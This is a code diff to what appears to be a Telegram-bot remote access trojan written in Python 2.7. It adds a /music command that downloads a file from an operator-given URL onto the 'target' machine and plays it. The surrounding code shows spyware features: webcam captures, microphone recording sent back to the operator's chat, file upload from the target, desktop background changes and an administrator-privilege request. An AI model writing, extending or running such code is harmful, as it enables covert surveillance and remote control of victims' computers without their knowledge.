@@ -1,5 +1,5 @@
 #!/usr/bin/env python2.7
-''' requirements: telegram.ext,autopy,wget,pyaudio,wave,ctypes'''
+''' requirements: telegram.ext,autopy,wget,pyaudio,wave,ctypes,pygame'''
 
 from telegram.ext import Updater , CommandHandler, dispatcher
 from cv2 import *
@@ -15,6 +15,7 @@ import wave
 import json
 import sys
 import ctypes
+import pygame
 
 ''' get admininstrator request'''
 
@@ -218,7 +219,18 @@ if __name__ == '__main__':
             waveFile.close()
             bot.send_audio(chat_id, audio=open('rec.wav', 'rb'))
             os.system('del rec.wav')
-
+        
+        def music_method(bot , update , args):
+            chat_id = update.message.chat_id
+            url = ' '.join(args)
+            wget.download(url , 'music.mp3')
+            bot.sendMessage(chat_id,"Music Has Been Uploaded..")
+            pygame.init()
+            pygame.mixer.music.load("music.mp3")
+            pygame.mixer.music.play()
+            bot.sendMessage(chat_id,"Playing ...")
+            
+        
 
         def background_method(bot , update , args):
             
@@ -242,6 +254,7 @@ if __name__ == '__main__':
             help_+= "/upload   => Upload jpg file from target [/upload c:\\test]\n"
             help_+= "/webcam   => webcam shot\n"
             help_+= "/record   => record micorophone ex:[/record 5]\n"
+            help_+= "/music    => playing background music ex:[/music url]\n"
             help_+= "/background => change background ex:[/background url]\n"
             chat_id = update.message.chat_id
             bot.sendMessage(chat_id,help_)
@@ -284,6 +297,9 @@ if __name__ == '__main__':
 
                 record = CommandHandler("record", record_method , pass_args=True)
                 update.dispatcher.add_handler(record)
+                
+                music = CommandHandler("music", music_method , pass_args =True)
+                update.dispatcher.add_handler(music)
 
                 background = CommandHandler("background" , background_method , pass_args=True)
                 update.dispatcher.add_handler(background)
